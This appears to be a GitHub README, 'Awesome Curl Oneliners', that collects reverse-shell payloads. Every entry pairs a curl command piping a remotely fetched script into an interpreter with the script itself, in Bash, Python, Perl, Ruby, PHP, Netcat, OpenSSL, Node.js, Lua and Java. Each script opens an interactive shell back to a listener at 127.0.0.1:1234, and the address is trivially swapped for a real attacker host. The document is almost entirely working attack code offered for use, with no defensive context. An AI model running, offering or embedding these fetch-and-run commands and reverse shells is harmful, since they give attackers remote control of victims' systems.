<h1 align="center"><b>Awesome Curl Oneliners</b></h1>

![image](https://github.com/user-attachments/assets/4e9e721d-5d9e-4e55-bcf2-6bde75d9b3d8)



<br>
<br>

Bash Reverse Shell

```bash

curl -s http://example.com/shell.sh | bash

```

shell.sh:

```bash

#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/1234 0>&1

```

Bash Reverse Shell using mkfifo

```bash

curl -s http://example.com/shell_fifo.sh | bash

```

shell_fifo.sh:

```bash

#!/bin/bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f

```

Python 2 Reverse Shell

```bash

curl -s http://example.com/shell_py2.py | python

```

shell_py2.py:

```bash

import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 1234))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])

```

Python 3 Reverse Shell

```bash

curl -s http://example.com/shell_py3.py | python3

```

shell_py3.py:

```bash

import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 1234))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])

```

Perl Reverse Shell

```bash

curl -s http://example.com/shell.pl | perl

```

shell.pl:

```bash

#!/usr/bin/perl
use Socket;
$i="127.0.0.1";
$p=1234;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
  open(STDIN,">&S");
  open(STDOUT,">&S");
  open(STDERR,">&S");
  exec("/bin/sh -i");
};


```

Ruby Reverse Shell

```bash

curl -s http://example.com/shell.rb | ruby

```

shell.rb:

```bash

#!/usr/bin/env ruby
require 'socket'
require 'open3'

def exec_cmd(cmd)
  Open3.popen2e(cmd) do |stdin, stdout_and_stderr, wait_thr|
    stdout_and_stderr.each do |line|
      yield line
    end
  end
end

s = TCPSocket.open("127.0.0.1", 1234)

while (line = s.gets)
  exec_cmd(line.chomp) do |output|
    s.puts output
  end
end

```

PHP Reverse Shell

```bash

curl -s http://example.com/shell.php | php

```

shell.php:

```bash

<?php
$ip = '127.0.0.1';
$port = 1234;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>

```

Netcat Reverse Shell

```bash

curl -s http://example.com/shell_nc.sh | bash

```

shell_nc.sh:

```bash

#!/bin/bash
nc -e /bin/sh 127.0.0.1 1234

```

OpenSSL Reverse Shell

```bash

curl -s http://example.com/shell_openssl.sh | bash

```

shell_openssl.sh:

```bash

#!/bin/bash
mkfifo /tmp/ssl; openssl s_client -quiet -connect 127.0.0.1:1234 < /tmp/ssl | /bin/sh > /tmp/ssl 2>&1; rm /tmp/ssl

```
Node.js Reverse Shell


```bash
curl -s http://example.com/shell.js | node



```

shell.js:

```bash

(() => {
    const net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    const client = new net.Socket();
    client.connect(1234, "127.0.0.1", () => {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the node script from crashing
})();

```
Lua Reverse Shell

 
```bash
curl -s http://example.com/shell.lua | lua
```
shell.lua:

 
```bash
local host, port = "127.0.0.1", 1234
local socket = require("socket")
local tcp = socket.tcp()
tcp:connect(host, port)
while true do
  local cmd = tcp:receive()
  local handle = io.popen(cmd)
  local result = handle:read("*a")
  handle:close()
  tcp:send(result)
end
```

```bash
curl -s -o shell.java http://localhost/shell.java && javac shell.java | java shell
```

shell.java:

```bash

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        try {
            Socket s = new Socket("127.0.0.1", 1234);
            InputStream in = s.getInputStream();
            OutputStream out = s.getOutputStream();
            Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
            InputStream pin = p.getInputStream();
            OutputStream pout = p.getOutputStream();
            while (!s.isClosed()) {
                while (in.available() > 0) pout.write(in.read());
                while (pin.available() > 0) out.write(pin.read());
                out.flush();
                pout.flush();
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                    // Process not finished yet
                }
            }
            p.destroy();
            s.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
